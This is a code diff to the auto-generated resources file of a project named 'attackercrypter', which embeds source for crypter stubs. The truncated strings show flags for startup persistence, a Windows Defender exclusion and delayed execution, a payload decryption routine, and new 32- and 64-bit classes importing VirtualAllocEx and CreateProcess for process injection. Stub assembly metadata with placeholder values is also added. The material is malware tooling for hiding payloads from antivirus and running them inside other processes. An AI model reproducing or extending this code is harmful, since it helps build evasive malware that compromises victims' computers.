@@ -62,15 +62,13 @@ namespace attackercrypter.Properties {
         
         /// <summary>
         ///   Looks up a localized string similar to using System;
-        ///using System.Collections.Generic;
         ///using System.Diagnostics;
         ///using System.IO;
-        ///using System.Linq;
-        ///using System.Text;
-        ///using System.Threading.Tasks;
+        ///using System.Runtime.InteropServices;
         ///
         ///namespace Stubcry
         ///{
+        ///
         ///    internal class config
         ///    {
         ///        public static bool istartup = false;
@@ -79,7 +77,7 @@ namespace attackercrypter.Properties {
         ///        public static bool isdotnet = false;
         ///        public static bool isexcludewd = false;
         ///        public static bool issleep = false;
-        ///        pub [rest of string was truncated]&quot;;.
+        ///        public static string folder = Path.Combine(Environment.GetFolderPath [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string config {
             get {
@@ -100,26 +98,74 @@ namespace attackercrypter.Properties {
         /// <summary>
         ///   Looks up a localized string similar to using System;
         ///using System.Collections.Generic;
-        ///using System.Diagnostics;
-        ///using System.IO;
+        ///using System.ComponentModel;
         ///using System.Linq;
-        ///using System.Reflection;
-        ///using System.Security.Cryptography;
+        ///using System.Runtime.InteropServices;
         ///using System.Text;
-        ///using System.Threading;
-        ///using System.Threading.Tasks;
-        ///using System.Windows.Forms;
         ///
         ///namespace Stubcry
         ///{
         ///
-        ///    static class Program
+        ///    class NIKBINARY32bit
         ///    {
+        ///        [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+        ///        private static extern IntPtr VirtualAllocEx(IntPtr process, IntPtr address, int size, uint allocationType, uint flProtect);
+        ///        [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+        ///        private static extern bool CreateProc [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string Nik32 {
+            get {
+                return ResourceManager.GetString("Nik32", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to using System;
+        ///using System.Collections.Generic;
+        ///using System.IO;
+        ///using System.Linq;
+        ///using System.Runtime.InteropServices;
+        ///using System.Text;
         ///
-        ///        
-        ///        public static byte[] FOKFILE(string base64Cipher, string base64Key, string base64IV)
-        ///        {
-        ///            byte[] cipherBytes = Convert.FromBase64St [rest of string was truncated]&quot;;.
+        ///namespace Stubcry
+        ///{
+        ///    public static class nIK64
+        ///    {
+        ///        [DllImport(&quot;kernel32.dll&quot;)]
+        ///        private static extern unsafe bool CreateProcess(
+        ///          string lpApplicationName,
+        ///          string lpCommandLine,
+        ///          IntPtr lpProcessAttributes,
+        ///          IntPtr lpThreadAttributes,
+        ///          bool bInheritHandles,
+        ///          uint dwCreationFla [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string NIK64 {
+            get {
+                return ResourceManager.GetString("NIK64", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to 
+        ///using System;
+        ///using System.Collections.Generic;
+        ///using System.Diagnostics;
+        ///using System.Drawing;
+        ///using System.IO;
+        ///using System.Linq;
+        ///using System.Net;
+        ///using System.Reflection;
+        ///using System.Runtime.InteropServices;
+        ///using System.Security.Cryptography;
+        ///using System.Text;
+        ///using System.Threading;
+        ///using System.Windows.Forms;
+        ///
+        ///[assembly: AssemblyTitle(&quot;#AssemblyProduct&quot;)]
+        ///[assembly: AssemblyDescription(&quot;#AssemblyDescription&quot;)]
+        ///[assembly: AssemblyCompany(&quot;#AssemblyProduct&quot;)]
+        ///[assembly: AssemblyPro [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Program {
             get {
